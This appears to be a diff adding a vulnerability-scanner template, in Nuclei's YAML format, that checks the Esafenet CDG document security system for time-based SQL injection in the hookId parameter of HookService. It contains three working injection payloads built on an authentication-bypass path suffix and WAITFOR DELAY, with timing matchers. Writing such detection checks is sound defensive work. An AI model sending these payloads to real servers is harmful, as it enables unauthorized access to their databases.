@@ -1,0 +1,23 @@
+id: CDGServer3-HookService-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 亿赛通CDG电子文档安全管理系统，该漏洞源于文件/com/esafenet/servlet/policy/HookService.java的参数hookId会导致SQL注入。
+  reference:
+    - https://github.com/wy876/POC/commit/0add3e2624917470e0be3f4ee666cc69df5319b9#diff-7ad5e609cb50e53e6e0552a48ed04e5e9a10f6808fcdb0ae8fe346976f7ae3f1R8
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}//CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:3'--"
+      - "{{BaseURL}}//CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:6'--"
+      - "{{BaseURL}}//CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:9'--"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
